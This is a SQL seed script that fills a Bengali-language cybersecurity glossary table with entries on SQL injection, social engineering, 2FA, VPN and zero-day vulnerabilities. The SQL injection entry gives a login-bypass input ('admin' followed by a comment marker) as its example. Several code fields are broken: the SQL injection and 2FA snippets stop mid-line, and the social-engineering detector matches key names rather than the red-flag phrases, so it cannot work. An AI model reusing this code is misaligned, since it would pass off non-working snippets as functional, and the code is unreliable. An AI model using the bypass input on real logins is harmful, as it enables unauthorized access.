  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'SQL Injection', 'ডেটাবেসে ক্ষতিকর কোড ঢোকানো',
  '📋 ফর্মে নাম লেখার জায়গায় কমান্ড লিখলে পুরো ডেটাবেস ফাঁকি।',
  'SQL Injection হলো OWASP #3 — attacker input ফিল্ডে malicious SQL inject করে unauthorized ডেটাবেস অ্যাক্সেস পায়। In-band, Inferential, Out-of-band — তিন ধরন।',
  'Login bypass, সব ডেটা dump, ডেটা মুছে ফেলা, admin access।',
  'Username: admin''-- দিলে পাসওয়ার্ড ছাড়াই লগইন।',
  $CODE019$// SQL Injection Prevention

// ❌ Vulnerable
const q = \$CODE019$,
  ARRAY['database','injection','OWASP','MySQL','PostgreSQL'],
  'critical', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'Social Engineering', 'মানুষকে manipulate করার কৌশল',
  '🎭 অভিনেতার মতো অন্য পরিচয়ে বিশ্বাস করিয়ে তথ্য নেওয়া।',
  'Social Engineering হলো মানুষের মনোবিজ্ঞান ব্যবহার করে তাদের confidential তথ্য দিতে বা নিরাপত্তা ভাঙতে manipulate করা। Technical skill নয়, human trust exploit।',
  'IT সাপোর্টে ফোন করে পাসওয়ার্ড রিসেট, বস সেজে fund transfer।',
  'Kevin Mitnick — বিশ্বের বিখ্যাত হ্যাকার, বেশিরভাগ hack ছিল social engineering।',
  $CODE020$// SE Defense Framework

const redFlags = {
  urgency:   "এখনই করতে হবে, দেরি হলে বিপদ!",
  authority: "আমি CEO/IT বলছি",
  fear:      "না করলে account বন্ধ হবে",
  scarcity:  "শুধু আজকের জন্য সুযোগ",
  flattery:  "আপনিই পারবেন, আপনি খুব বুদ্ধিমান"
};

function detectSocialEngineering(message) {
  const flags = Object.entries(redFlags)
    .filter(([key, example]) =>
      message.toLowerCase().includes(key)
    ).map(([key]) => key);
  
  return {
    riskLevel: flags.length,
    flags,
    action: flags.length > 1
      ? "🚨 Verify through official channel!"
      : "ℹ️ Proceed with caution"
  };
}$CODE020$,
  ARRAY['human-factor','pretexting','vishing','baiting','manipulation'],
  'high', 'Social Engineering', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'T', 'Two-Factor Authentication (2FA)', 'দুই স্তরের পরিচয় যাচাই',
  '🏧 ATM-এ কার্ড + PIN দুটোই লাগে — একটা হলে হয় না।',
  '2FA (MFA) হলো দুটি আলাদা factor দিয়ে পরিচয় যাচাই: (1) কিছু জানা — পাসওয়ার্ড, (2) কিছু থাকা — OTP/hardware key, (3) কিছু হওয়া — biometric।',
  'Gmail, Facebook, bank — গুরুত্বপূর্ণ সব অ্যাকাউন্টে অবশ্যই।',
  'পাসওয়ার্ড দেওয়ার পরেও Authenticator app-এর OTP লাগে।',
  $CODE021$// TOTP 2FA (Node.js + speakeasy)
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Setup
async function setup2FA(userId, email) {
  const secret = speakeasy.generateSecret({
    name: \$CODE021$,
  ARRAY['MFA','TOTP','OTP','authenticator','hardware-key'],
  'low', 'Defense', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'V', 'VPN', 'ভার্চুয়াল প্রাইভেট নেটওয়ার্ক',
  '🚇 খোলা রাস্তায় গোপন সুড়ঙ্গ দিয়ে যাওয়া — কেউ দেখতে পাচ্ছে না।',
  'VPN একটি এনক্রিপ্টেড টানেল তৈরি করে তোমার ট্র্যাফিককে একটি দূরবর্তী সার্ভারের মাধ্যমে route করে — IP লুকায়, ডেটা এনক্রিপ্ট করে। OpenVPN, WireGuard জনপ্রিয়।',
  'Public WiFi নিরাপত্তা, geo-block bypass, remote work।',
  'WireGuard VPN দিয়ে বাড়ি থেকে অফিস নেটওয়ার্কে secure access।',
  $CODE022$# WireGuard VPN Setup

# Key generation
wg genkey | tee server.key | wg pubkey > server.pub
wg genkey | tee client.key | wg pubkey > client.pub

# /etc/wireguard/wg0.conf
cat > /etc/wireguard/wg0.conf << 'EOF'
[Interface]
PrivateKey = <server_private_key>
Address = 10.0.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32
EOF

wg-quick up wg0
systemctl enable wg-quick@wg0$CODE022$,
  ARRAY['privacy','tunnel','OpenVPN','WireGuard','remote'],
  'low', 'Defense', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'Z', 'Zero-Day Vulnerability', 'অজানা নিরাপত্তা ত্রুটি',
  '🕳️ বাড়িতে গোপন সুড়ঙ্গ — মালিক জানে না কিন্তু চোর জানে।',
  'Zero-Day হলো এমন vulnerability যা vendor জানে না বা patch বের করেনি। ''Zero days'' মানে সুরক্ষার জন্য শূন্য দিন বাকি।',
  'Nation-state hacking, APT attacks, Stuxnet-এর মতো cyberweapon।',
  'Stuxnet ৪টি zero-day ব্যবহার করে ইরানের nuclear centrifuge ধ্বংস করেছিল।',
  $CODE023$// Zero-Day Defense: Zero Trust Architecture

const zeroTrust = {
  // Never Trust, Always Verify
  verifyRequest: async (req) => {
    const checks = await Promise.all([
      verifyIdentity(req.user),        // কে?
      checkDeviceHealth(req.deviceId), // কোন ডিভাইস?
      validateLocation(req.ip),        // কোথা থেকে?
      checkBehavior(req.user, req.action) // স্বাভাবিক?
    ]);
    return checks.every(c => c.passed);
  },
  
  // Virtual Patching (WAF rule)
  // ModSecurity: block known attack patterns
  // while vendor patches
  
  // Threat Intel
  subscribeFeeds: [
    'https://nvd.nist.gov/feeds',
    'MITRE ATT&CK',
    'CVE Database'
  ]
};$CODE023$,
  ARRAY['CVE','exploit','APT','zero-trust','patch'],
  'critical', 'Vulnerability', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;